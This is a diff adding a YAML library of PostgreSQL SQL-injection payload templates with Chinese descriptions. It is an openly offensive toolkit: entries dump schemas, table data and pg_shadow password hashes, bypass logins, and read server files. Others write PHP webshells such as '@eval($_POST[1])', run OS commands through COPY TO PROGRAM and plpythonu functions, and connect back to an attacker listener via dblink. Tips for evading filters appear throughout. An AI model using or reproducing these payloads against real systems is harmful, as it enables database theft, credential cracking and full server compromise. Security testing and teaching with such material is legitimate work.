@@ -1,0 +1,586 @@
+ruleDB: v0.1.0
+# PostgreSQL 注入模板。
+# 方言特点：字符串拼接用 ||，延时用 pg_sleep，命令执行靠 COPY ... TO PROGRAM（需超级用户）。
+
+templates:
+  - id: sqli.postgresql.detect.version
+    name: PostgreSQL 版本回显
+    desc: 列数对上之后先跑它，一次把版本拿到；expr 槽位换成 current_database() / current_user 就顺带读了库名和用户，省一趟
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+      expr:    {options: ["version()", "current_database()", "current_user"], default: "version()"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.union.basic
+    name: PostgreSQL UNION 联合查询
+    desc: 还不知道回显位时先用它：整条 SELECT 都是数字占位，不会因为列的类型对不上而报错。数字出现在页面上之后再换读数据的条目
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos)>> <<comment>>"
+    vars: []
+    requires: [echo, recon]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.union.marker
+    name: PostgreSQL UNION 回显位标记
+    desc: 在回显位放固定标记，用来定位页面上的回显点
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+      marker:  {options: ["0x41", "'ab'", "'a b'"], default: "0x41"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,marker)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.postgresql.union.tables
+    name: PostgreSQL UNION 读表名
+    desc: 读当前库有哪些表。默认用 string_agg 一次把表名全聚合出来（选 table_name 只返回第一行）；要列名得换 union.columns 那条，表名要先侦察到
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+      # 默认用聚合版：读表名时要的是「所有表名」而不是第一行那一个
+      expr:    {options: ["string_agg(table_name,',')", "table_name"], default: "string_agg(table_name,',')"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM information_schema.tables <<comment>>"
+    vars: []
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.union.current
+    name: PostgreSQL 当前库与用户
+    desc: 用 || 拼接当前库名和当前用户
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,current_database()||':'||current_user)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.postgresql.error.cast
+    name: PostgreSQL CAST 报错注入
+    desc: 把表达式转成 int 触发报错，报错信息里带出值
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> AND 1=CAST((<<expr>>) AS int) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.postgresql.bool.blind
+    name: PostgreSQL 布尔盲注
+    desc: 页面在条件为真/假时返回的内容不同时用。PG 有 pg_sleep，真假差异看不出来时直接上时间盲注那两条，比别的方言好使
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> AND (<<cond>>) <<comment>>"
+    vars: [cond]
+    requires: [boolean]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.time.pgsleep
+    name: PostgreSQL 时间盲注 pg_sleep
+    desc: 堆叠查询里调 pg_sleep
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+      secs:  {options: ["3", "5", "10"], default: "5"}
+    body: "<<close>>; SELECT pg_sleep(<<secs>>)--"
+    vars: []
+    requires: [stacked]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 命令执行 / 文件 ----
+  # 载荷文本是 SQL，效果是执行系统命令（同 MSSQL 的 xp_cmdshell，content_type 按语法归档）。
+
+  - id: sqli.postgresql.cmd.copy_program
+    name: PostgreSQL COPY TO PROGRAM 命令执行
+    desc: 载荷是 SQL，效果是执行 `<<cmd>>` 里的系统命令
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=9.3"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+    body: "<<close>>; COPY (SELECT '') TO PROGRAM '<<cmd>>'--"
+    vars: [cmd]
+    requires: [stacked, dba]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.postgresql.file.read
+    name: PostgreSQL 读文件
+    desc: 有超级用户权限时读服务器上的文本文件。只给了目录、不知道文件名的话先用 pg_ls_dir 那条列目录，比挨个猜快
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.1"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,pg_read_file('<<filepath>>'))>> <<comment>>"
+    vars: [filepath]
+    requires: [dba]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.auth.bypass
+    name: PostgreSQL 登录绕过
+    desc: 闭合符按注入点上下文选
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> OR 1=1<<comment>>"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.auth.bypass.admin
+    name: PostgreSQL 指定用户登录绕过
+    desc: 已知用户名时的绕过。用户名默认 admin，按目标实际账号改
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      username: {options: ["admin", "administrator", "root", "sa", "test", "guest"],
+                 default: "admin"}
+      close:    {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment:  {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<username>><<close>> <<comment>>"
+    vars: []
+    requires: [recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 信息收集 ----
+
+  - id: sqli.postgresql.union.databases
+    name: PostgreSQL 读库名
+    desc: 要跳到别的库时才用它，默认把 pg_database 里的库名一次全列出来。只确认当前库的话 detect.version 那条就够
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["datname", "string_agg(datname,',')", "current_database()"],
+               default: "string_agg(datname,',')"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM pg_database <<comment>>"
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.union.columns
+    name: PostgreSQL 读列名
+    desc: 已知表名后读它的列名
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["column_name", "string_agg(column_name,',')"],
+               default: "string_agg(column_name,',')"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM information_schema.columns WHERE table_name='<<table>>' <<comment>>"
+    vars: [table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.union.dump
+    name: PostgreSQL 读列数据
+    desc: 0x7c 在 PG 里不是竖线，拼接要用 chr(124)
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      sep:    {options: ["','", "'|'", "chr(124)"], default: "','"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,string_agg(<<col>>,<<sep>>))>> FROM <<table>> <<comment>>"
+    vars: [col, table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.union.hash
+    name: PostgreSQL 读账号密码哈希
+    desc: pg_shadow 需要超级用户；MD5 开头的哈希可以直接拿去爆破
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,usename||':'||passwd)>> FROM pg_shadow <<comment>>"
+    requires: [echo, dba]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 报错注入 ----
+
+  - id: sqli.postgresql.error.xml
+    name: PostgreSQL query_to_xml 报错注入
+    desc: CAST 那条被过滤时的替代。query_to_xml 把查询结果包成 XML，再把它塞进 int 触发报错，值随报错一起出来
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> AND 1=CAST((SELECT query_to_xml('SELECT <<expr>>',true,true,'')) AS int) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 文件 / 命令 ----
+
+  - id: sqli.postgresql.file.list
+    name: PostgreSQL 列目录
+    desc: 比逐个猜文件名快。pg_ls_dir 同样要超级用户
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,array_to_string(pg_ls_dir('<<filepath>>'),','))>> <<comment>>"
+    vars: [filepath]
+    requires: [echo, dba]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.file.write
+    name: PostgreSQL COPY TO 写 webshell
+    desc: 需要超级用户。目标文件必须不存在或可覆盖，路径要对进程用户可写
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+      code:  {options: ["<?php @eval($_POST[1]);?>", "<?php system($_GET[c]);?>"],
+              default: "<?php @eval($_POST[1]);?>"}
+    body: "<<close>>; COPY (SELECT '<<code>>') TO '<<filepath>>'--"
+    vars: [filepath]
+    requires: [stacked, dba, writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 时间盲注 ----
+
+  - id: sqli.postgresql.time.pgsleep.inline
+    name: PostgreSQL 时间盲注（非堆叠）
+    desc: 不支持堆叠查询时用这条。pg_sleep 是集合返回函数，放在 FROM 里当数据源
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      secs:    {options: ["3", "5", "10"], default: "5"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> AND (SELECT 1 FROM pg_sleep(<<secs>>)) <<comment>>"
+    vars: []
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.stacked.insert
+    name: PostgreSQL 堆叠插入数据
+    desc: 直接改库，CTF 里常用来插一个管理员账号
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; INSERT INTO <<table>> (<<fields>>) VALUES (<<values>>)--"
+    vars: [table, fields, values]
+    requires: [stacked]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 文件：pg_read_file / COPY 之外的几条路 ----
+
+  - id: sqli.postgresql.file.read_binary
+    name: PostgreSQL 读二进制文件
+    desc: pg_read_file 只吃文本，碰到二进制会直接报 invalid byte sequence for encoding——那不是权限问题，是该换这条。读回来是 bytea，用 encode(...,'hex') 转成十六进制回显，前端再还原。默认只给超级用户，11 起 pg_read_server_files 角色的成员也行；非超级用户实际上只能碰到集群目录和 log_directory 下的文件
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=9.1"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,encode(pg_read_binary_file('<<filepath>>'),'hex'))>> <<comment>>"
+    vars: [filepath]
+    requires: [echo, dba]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.file.read.lo
+    name: PostgreSQL 大对象读文件
+    desc: 读文件的三条路里最隐蔽的一条：lo_import 按**服务器进程**的权限读，落地成大对象再取回来。比 pg_read_file 强的地方是能吃二进制（回来是 bytea）。一次读 1000000 字节，长文件读完要调大这个数。**10 及以前这条路径在代码里硬校验 superuser**，GRANT EXECUTE 也没用；11 起才改成可以用 pg_read_server_files 角色满足
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.1"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    # 262144 是 lo_open 的 INV_READ 常量；这三层函数是嵌套在**一个表达式**里的，
+    # 所以不需要堆叠——不需要多语句就能读
+    body: "<<close>> UNION SELECT <<select(cols,pos,convert_from(loread(lo_open(lo_import('<<filepath>>'),262144),1000000),'UTF8'))>> <<comment>>"
+    vars: [filepath]
+    requires: [echo, dba]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.postgresql.file.write.lo
+    name: PostgreSQL 大对象写 webshell
+    desc: COPY TO 那条被规则拦下时的替代：把内容按十六进制灌进大对象，再 lo_export 落到 Web 路径。写 pg_largeobject 是改系统目录，要超级用户（10 及以前 lo_export 在代码里硬校验 superuser，11 起可以用 pg_write_server_files 角色）；三条语句必须能堆叠，且目标路径要么不存在要么可覆盖
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.1"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+      # OID 用哪个都行，别撞上库里已有的大对象；三个都很大，撞车概率低
+      n:     {options: ["99999", "12345", "31337"], default: "99999"}
+    body: "<<close>>; SELECT lo_create(<<n>>); INSERT INTO pg_largeobject VALUES (<<n>>,0,decode('<<hex>>','hex')); SELECT lo_export(<<n>>,'<<filepath>>')--"
+    vars: [hex, filepath]
+    requires: [stacked, dba, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 带外 ----
+
+  - id: sqli.postgresql.oob.dblink
+    name: PostgreSQL dblink 带外
+    desc: 让数据库进程主动连回你的监听——既能确认注入生效，也能确认库进程自己的出网策略（这一条常常和 Web 层的出网策略不一样）。dblink 是 contrib 模块不是核心，得先建过扩展；建扩展一般要超级用户（dblink 之外还有权限全被回收的 dblink_connect_u，那是非超级用户变体）。连不上时报的是连接超时，和「注入没生效」要分清
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=7.3"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; SELECT dblink_connect('host=<<lhost>> port=<<lport>> dbname=a user=a password=a');--"
+    vars: [lhost, lport]
+    requires: [stacked, outbound, listener, dba]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 报错注入的补充形态 ----
+
+  - id: sqli.postgresql.error.cast.agg
+    name: PostgreSQL 聚合后 CAST 报错
+    desc: CAST 报错一次只带得回一行，要整列时先用 array_agg 聚起来再报错。分隔符要挑值里不会出现的字符——列里本来就有逗号时用默认的会分不清边界。还有一点：值是纯数字时 CAST 到 int **不会失败**、也就没有报错可看，要保险就先把子查询包一层拼个非数字前缀（chr(126)||...）
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.4"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      sep:     {options: ["','", "'|'", "chr(124)", "'~'"], default: "','"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> AND 1=CAST((SELECT array_to_string(array_agg(<<col>>),<<sep>>) FROM <<table>>) AS int) <<comment>>"
+    vars: [col, table]
+    requires: [error, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 读配置 ----
+
+  - id: sqli.postgresql.recon.settings
+    name: PostgreSQL 读配置项
+    desc: current_setting() 读运行期参数，最值钱的是 data_directory——拿到它就能直接接上 pg_ls_dir / pg_read_file，省掉猜路径。data_directory / config_file / hba_file 这几个带 GUC_SUPERUSER_ONLY，非超级用户读会直接报 must be superuser to examine ...（10 起 pg_read_all_settings 角色的成员也行）；读不到是权限不够，不是语法错
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      # 名字后面标了「要超级用户」的那几档，普通角色读会直接报错
+      key:
+        options:
+          - {id: datadir, name: "data_directory（要超级用户）", val: "data_directory"}
+          - {id: cfgfile, name: "config_file（要超级用户）",    val: "config_file"}
+          - {id: hbafile, name: "hba_file（要超级用户）",       val: "hba_file"}
+          - {id: logdir,  name: "log_directory",                val: "log_directory"}
+          - {id: port,    name: "port",                         val: "port"}
+          - {id: ver,     name: "server_version",               val: "server_version"}
+        default: datadir
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,current_setting('<<key.val>>'))>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 堆叠下的函数执行 ----
+
+  - id: sqli.postgresql.stacked.create_function
+    name: PostgreSQL CREATE FUNCTION 执行命令
+    desc: COPY TO PROGRAM 被关键字规则拦下时的替代：建一个能跑命令的函数再调用它，命令结果直接作为结果集回来。需要超级用户，且目标装了对应语言扩展——默认只有 plpgsql，plpythonu / plperlu 都要额外装，跑不通多半是扩展没装不是权限不够
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [postgresql, postgres]
+    version: ">=8.0"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+      # 这里不给 LANGUAGE C：那条路要先有编译好的 .so 落在服务器上，
+      # 纯靠注入写不进去（写文件本身又是另一个前提），写出来只会误导
+      lang:
+        options:
+          - {id: plpythonu, name: "PL/Python（需要 plpythonu）", def: "CREATE FUNCTION pwn() RETURNS text AS $$ import subprocess; return subprocess.check_output(['<<cmd>>']).decode() $$ LANGUAGE plpythonu"}
+          - {id: plperlu,   name: "PL/Perl（需要 plperlu）",     def: "CREATE FUNCTION pwn() RETURNS text AS $$ system('<<cmd>>'); return '' $$ LANGUAGE plperlu"}
+        default: plpythonu
+    body: "<<close>>; <<lang.def>>; SELECT pwn()--"
+    vars: [cmd]
+    requires: [stacked, dba]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
